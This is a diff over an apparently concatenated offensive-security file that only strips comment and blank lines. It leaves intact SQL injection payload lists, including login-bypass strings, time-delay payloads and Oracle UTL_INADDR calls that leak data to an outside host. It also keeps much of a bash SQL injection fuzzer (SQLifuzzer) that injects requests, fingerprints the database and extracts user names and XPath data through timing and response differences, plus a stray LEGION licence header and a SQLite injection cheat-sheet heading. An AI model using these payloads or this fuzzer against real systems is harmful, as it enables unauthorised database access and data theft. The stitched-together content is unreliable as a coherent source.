@@ -70,8 +70,6 @@
 "a"" or 3=3--"
 "hi"") or (""a""=""a"
 #	    Hash comment
-# Numeric
-# from wapiti
 #NAME?
 %		wildcard attribute indicator
 %"
@@ -22648,9 +22646,7 @@ root') or ('1'='1'--
 root') or ('1'='1'/*
 root'/*
 root'or 1=1 or ''='
-# regex replace as many as you can with your fuzzer for best results:
 # <user-fieldname> <pass-fieldname> <username>
-# also try to brute force a list of possible usernames, including possile admin acct names
 <username>' OR 1=1--
 'OR '' = '	Allows authentication without a valid username.
 <username>'--
@@ -22659,7 +22655,6 @@ root'or 1=1 or ''='
 """
 LEGION (https://govanguard.io)
 Copyright (c) 2019 GoVanguard
-
     This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public
     License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later
     version.
@@ -23045,11 +23040,9 @@ reqcount=0
 timedelayduration="20"
 #delay threshold in seconds. When running a time delay scan, this can be set to tune out false positives. This should be higher than 'normal' request times to prevent false positives, but lower than the timedelay value:
 timedelaythreshhold="1" 
-# set the search term to a non-null value to prevent a match on an blank value:
 ErrorString="foo123rewerwer435345345345"
 #by default the header value is set to nill
 headertoset=''
-# function definitions
 encodeme()
 {
 inputbuffer=$encodeinput
@@ -23102,7 +23095,6 @@ uriunicode()
 #returns uriinputencoded
 #also receives and decodes uriinputdecode string
 #also returns uriinputdecoded string
-# how to use me:
 #  $uriinputencode="my string that i want encoded"
 #  uriunicode
 #  $variableholdingencodedstring=uriinputencoded
@@ -23433,7 +23425,6 @@ if [[ "$selectsuccess" == 0 ]] ; then
 		uriinputencode="1$quote union select $nullstring from dual$end"
 		badparams=`echo "$cleanoutput" | replace "$payload" "1$quote union select $nullstring from dual$end"`
 	fi	
-	
 	#echo "DEBUG oracle $badparams"
 	statusselDUAL=`echo $response | cut -d ":" -f 1`
 	lengthselDUAL=`echo $response | cut -d ":" -f 2`
@@ -23443,7 +23434,6 @@ if [[ "$selectsuccess" == 0 ]] ; then
 		#echo "UNION SELECT looks good! $request"
 		echo -e '\E[31;48m'"\033[1m[ORACLE DB DETECTED - FROM DUAL REQ:$K]\033[0m $request"
 		echo "[ORACLE DB DETECTED - FROM DUAL REQ:$K] $request" >> ./output/$safelogname$safefilename.txt;
-		
 		echo -e '\E[31;48m'"\033[1m[UNION SELECT: $colno COL REQ:$K]\033[0m $request"
 		echo "[UNION SELECT: $colno COL REQ:$K] $request" >> ./output/$safelogname$safefilename.txt;
 		selectsuccess=1
@@ -23567,7 +23557,6 @@ if [[ $method != "POST" ]]; then #we're doing a get - simples
 		echo "[$remessage REQ:$K] $method URL: $uhostname$page"?"$badparams" >> ./output/$safelogname$safefilename.txt
 		echo -e '\E[31;48m'"\033[1m[$remessage REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
 dbtypecheck()
-# try to figure out the backend db using conditional tests:
 #beginning of dbms enumeration if statement:
 if [[ "$dbms" != "" ]] ; then
 	echo "DBMS already specified as $dbms"
@@ -23911,7 +23900,6 @@ cat ./finalshortlist.txt > ./output/$safelogname.$safehostname.xpath
 echo "Nodes enumerated:"
 cat ./finalshortlist.txt
 echo "Extracting data from enumerated nodes..."
-			
 ###
 cat ./finalshortlist.txt | while read entry ; do
 	#init some params
@@ -24144,7 +24132,6 @@ if [[ "$stringextract" == "1" ]] ; then
 				if [[ $comicount == 1 ]] ; then
 					echo -n "Comment: "
 					echo -n "Comment: " >> ./listofxpathelements.txt	
-					
 				echo -n "$char"
 				echo -n "$char" >> ./listofxpathelements.txt	
 				break
@@ -24247,9 +24234,7 @@ cat ./listofxpathelements.txt 2>/dev/null
 lettergrab()
 echo "Trying status/length-based data extraction"
 # adding code to check if we've already got the sysuserlen (length of the system user name) and nambuf (the system user name) values.
-# if we do, lets try em out again on this parameter
 # if this fails, continue to re-run the full lettergrab() as normal...
-# initalise a check flag:
 check_flag=0 
 if [[ "$nambuf" != "" ]] ; then
 	echo "Trying credentials already found: $nambuf"
@@ -24410,7 +24395,6 @@ lettergrabtimebased()
 echo "Trying time-based data extraction"
 #this is the same as lettergrab, but its *time*, not length/status based
 #currently have to hard-code the detection delay to 8 seconds as using a dynamic variable led to a weird bug...  
-# currently only works for MSSQL
 # if this fails, continue to re-run the full lettergrabtimebased() as normal...
 		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if system_user = '$nambuf' waitfor delay '0:0:0'$end"`
 	time_false=`echo $response | cut -d ":" -f 3 | cut -d "." -f1`
@@ -24742,7 +24726,6 @@ while getopts l:c:t:nsqehx:d:bu:P:v:L:M:Q:I:T:C:rWS:ABjYfoD:FGHRZVUOKJENakmpwyz:
     z) # Multi Byte Quote
 	z=true  
     esac
-# help mode activated
 if [ true = "$h" ] || ["$1" == ""] 2>/dev/null ; then
 	echo "$0 - A wrapper for curl written in bash :-)"
 	echo "Written by Toby Clarke"
@@ -24842,7 +24825,6 @@ if [[ "$lastchar" == "/" ]] ; then
 if [[ true != "$P" && true != "$T" && true != "$s" && true != "$n" && true != "$q" && true != "$e" && true != "$b" && true != "$C" && true != "$r" && true != "$j" ]]; then
 	echo "FATAL: I need a payload type" >&2
 	echo "Some examples are: -s, -n, -q, -r, -e, -b, -C" >&2
-# this fixes weird behaviour if no cookie value is given by setting a stupid cookie
 if [[ "$cookie" == "" ]]; then
 	echo "Cookie not provided. Setting cookie to foo=bar" >&2
 	cookie="foo=bar"
@@ -24872,10 +24854,8 @@ if [[ "$fooa" != "0" ]] ; then
 	else 
 		echo "Ignoring prior reports"
 ### session file checking / creation code ###
-# the idea here is that the user should be happy killing and resuming a scan.
 # this is facilitated by saving the scan progress (specifically the request 
 # or "URL number" last scanned) in a session file and then checking for the 
-# presence of this file whenever a scan is launched
 if [ true != "$Q" ] ; then
 	#echo "Checking for session file."
 	if [ true = "$f" ] ; then
@@ -24998,7 +24978,6 @@ if [[ true != "$I" && true != "$T" ]] ; then
 				echo "POST" $outer"???"$mparams  >> 1scannerinputlist.txt
 				echo "POST" $outer"???"$mparams 
 				rm ./partlist.txt
- 
 		if [ $captureflag == 1 ]; then
 		# we are capturing burp log info:
 		# first question: is it a POST or GET request?
@@ -25039,7 +25018,6 @@ if [[ true != "$I" && true != "$T" ]] ; then
 						echo "POST" $outer"?"$LINE  >> 1scannerinputlist.txt
 						# In the case of a 'normal' POST request, POST body parameters are preceded with ?, like this:
 						# POST /foobar.aspx?bodyparam=2
-						
 				#reset the post flag in preparation for parsing the next request:
 				postflag=0
 			#if we find a line like: Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOXye4QTitIZotFdn
@@ -25162,7 +25140,6 @@ if [ false = "$o" ] ; then
 			echo $quack >> exceptionlist.txt
 			echo $quack >> cleanscannerinputlist.txt
 	cp scannerinputlist.txt cleanscannerinputlist.txt;
-# the user wants to parse the burplog and create a .input file
 if [ true = "$P" ] ; then
 	cat cleanscannerinputlist.txt | while read quack; do
 		echo $quack >> $parseOutputFile
@@ -25219,7 +25196,6 @@ if [ true = "$r" ] ; then
 #		echo $quack >> payloads.txt
 #	done
 # this code scans through a custom payload list and replaces 'X' with the $timedelayduration value:
-# this allows users to specifiy their own timedelay sqli payloads:
 if [ true = "$C" ] ; then
 	cat $custompayloadlist | while read quack; do
 #flatten this down just in case theres an old version lying about:
@@ -25258,12 +25234,8 @@ else
 #################scanner section#########################
 K=0
 mainrequester()
-# beginning of main request function
-# this section is written confusingly:
 # first we do clean & evil GET requests
 # then we do clean & evil POST requests
-# but POST requests are split out three ways: normal POST, POST URI params, POST data params
-# also, for POSTs, we only send one good request per URL instead of one per parameter
 if [ true = "$Z" ] ; then echo "DEBUG! Entering REQUEST PHASE"; fi
 sessionStorage=`cat ./session/$safelogname.$safehostname.sessionStorage.txt 2>/dev/null`
 if [[ $method != "POST" ]]; then #we're doing a get - simples
@@ -25344,7 +25316,6 @@ tput sgr0 # Reset attributes.
 ### new scanning engine ###
 ##BEGINING OF PER-URL LOOP:
 firstPOSTURIURL=0
-# the firstPOSTURIURL flag handles situations where POST requests have URI parmeters and has three states: 
 # 0 no postURI params (this must be a GET or a normal POST)
 # 1 postURI param detected, fuzz the postURI params, send the post data params as a static string
 # 2 postURI param detected, fuzz the post data params, send the postURI params as a static string
@@ -25441,7 +25412,6 @@ cat cleanscannerinputlist.txt | while read i; do
 				#this branch is taken for the first and last URLs, otherwise these wouldent be captured in the siteanalysis log
 				#this branch is taken when a new URL comes along
 				#the below writes out the old URL and paramlist info to the siteanalysis log
-				
 				echo "$oldURL" >> ./session/$safelogname.$safehostname.siteanalysis.txt
 				cat ./session/$safelogname.$safehostname.oldparamlist.txt >> ./session/$safelogname.$safehostname.siteanalysis.txt
 				#the below clears away the old paramlist
@@ -25716,7 +25686,6 @@ cat cleanscannerinputlist.txt | while read i; do
 								newand1eq1time=`echo "$and1eq1" | cut -d ":" -f 3| cut -d "." -f1`
 								newand1eq2time=`echo "$and1eq2" | cut -d ":" -f 3| cut -d "." -f1`
 								((newtime_diff=newand1eq2time-newand1eq1time))
-							
 								echo "INFO: REPEAT TIME DIFF: $newtime_diff SECS"
 								((finaltime_diff=newtime_diff-time_diff))
 								echo "INFO: DIFFERENCE BETWEEN BOTH TIMEDELAY REQUESTS: $finaltime_diff SECS"
@@ -25790,7 +25759,6 @@ cat cleanscannerinputlist.txt | while read i; do
 oldURL=`echo $i | cut -d "?" -f 1`
 echo $oldURL > ./session/$safelogname.$safehostname.oldURL.txt
 #this code stores the stringofparams value (which is now old) in a text file
-# infact, a list is created with a parameter name on each new line:
 for dfg in $stringofparams; do
 	echo `echo $dfg | cut -d "=" -f1` >> ./session/$safelogname.$safehostname.oldparamlist.txt
 #the list created in the above code grows with each URL as long as the pages match
@@ -25824,10 +25792,8 @@ if [[ $alertmessage != "" ]] ; then
 echo "" > ./session/$safehostname.session.txt
 #need to do this at the end to clean up:
 #need to update this
-# this sorts the results alphabetically in reverse to make the good stuff float to the top of the page, and the errors sink to the bottom
 cat ./aggoutputlog.txt 2>/dev/null | sort -r | uniq > ./output/$safelogname-sorted-$safefilename.txt  
 #cat ./output/$safelogname$safefilename.status.txt 2>/dev/null | sort | uniq >> ./output/$safelogname-sorted-$safefilename.txt
-# code that parses the output .txt file and creates a nice html report:
 echo "<html>" >> ./output/$safelogname-report-$safefilename.html
 echo "<head>" >> ./output/$safelogname-report-$safefilename.html
 echo "<title>SQLifuzzer Results Page</title>" >> ./output/$safelogname-report-$safefilename.html
@@ -32636,7 +32602,6 @@ a"or/*g*/345=345-- #
 1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--
 1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--
 SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/ FROM some_table WHERE ex = ample
-# SQLite Injection
 ## Summary
 * [SQLite comments](#sqlite-comments)
 * [SQLite version](#sqlite-version)
